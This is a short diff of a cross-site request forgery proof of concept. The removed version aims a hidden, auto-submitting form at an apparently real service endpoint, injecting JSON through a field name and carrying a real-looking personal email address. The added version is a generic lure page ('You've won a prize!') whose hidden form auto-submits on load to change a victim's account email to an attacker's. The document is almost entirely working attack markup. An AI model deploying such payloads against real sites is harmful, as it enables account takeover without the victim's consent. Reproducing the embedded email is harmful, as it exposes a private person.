@@ -1,5 +1,15 @@
-<!-- Hosted on attacker-site.com -->
-<form id="csrf-form" action="https://elitebot.live/_serverFn/bfd09b63..." method="POST">
-  <input type="hidden" name='{"email":"juliusmuramuzi86@gmail.com", "paymentMethod":"USDT-TRC20", "dummy":"' value='"}'>
-</form>
-<script>document.getElementById('csrf-form').submit();</script>
+<!-- Hosted on attacker-domain.com -->
+<html>
+  <body>
+    <h1>You've won a prize!</h1>
+    <!-- The form is hidden from the user -->
+    <form id="attack-form" action="https://target-site.com/update-account" method="POST" style="display:none;">
+      <input type="hidden" name="newEmail" value="attacker@malicious.com">
+    </form>
+
+    <script>
+      // Automatically submit the form as soon as the page loads
+      document.getElementById('attack-form').submit();
+    </script>
+  </body>
+</html>
